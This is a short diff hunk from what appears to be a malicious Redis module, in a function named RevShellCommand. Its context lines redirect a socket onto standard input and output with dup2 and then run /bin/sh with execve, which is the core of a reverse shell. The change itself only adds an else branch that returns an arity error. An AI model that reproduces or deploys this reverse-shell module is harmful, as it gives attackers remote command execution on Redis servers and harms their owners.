@@ -55,7 +55,9 @@ int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
 		dup2(s, 2);
 
 		execve("/bin/sh", 0, 0);
-	}
+        } else {
+                return RedisModule_WrongArity(ctx);
+        }
     return REDISMODULE_OK;
 }
 
